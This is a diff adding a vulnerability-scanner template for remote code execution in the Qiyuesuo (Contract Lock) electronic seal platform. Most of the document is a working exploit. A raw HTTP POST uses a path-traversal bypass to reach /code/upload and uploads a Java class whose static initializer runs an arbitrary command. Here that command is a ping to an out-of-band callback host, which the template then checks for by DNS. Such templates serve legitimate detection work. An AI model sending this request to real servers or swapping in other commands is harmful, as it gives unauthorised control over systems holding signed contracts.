@@ -1,0 +1,40 @@
+id: qiyuesuo-code-upload-rce
+
+info:
+  name: Qiyuesuo Electronic Seal Platform code/upload RCE
+  author: qwtd
+  severity: critical
+  description: |
+    A vulnerability in the Contract Lock Electronic Signature System allows remote attackers to execute arbitrary commands via the upload2 functionality.
+  remediation: |
+    To mitigate this vulnerability, ensure that the system is updated to the latest version with all security patches applied. Additionally, implement strict input validation and sanitization on user inputs to prevent unauthorized command execution. Consider using a web application firewall (WAF) to filter and monitor HTTP requests for malicious activity.
+  tags: 契约锁-电子签署平台
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /callback/%2E%2E;/code/upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R
+
+        ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
+        Content-Disposition: form-data; name="file"; filename="111.txt"
+        Content-Type: text/plain
+
+        package com;
+        import com.qiyuesuo.utask.java.BaseTimerTask;
+        import java.lang.reflect.Method;
+        public class sleepPayload extends BaseTimerTask {
+            static {try{Runtime.getRuntime().exec(new String[]{"ping","{{interactsh-url}}"});
+            java.net.InetAddress.getByName("{{interactsh-url}}");}catch (Exception e){}}
+        }
+        ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
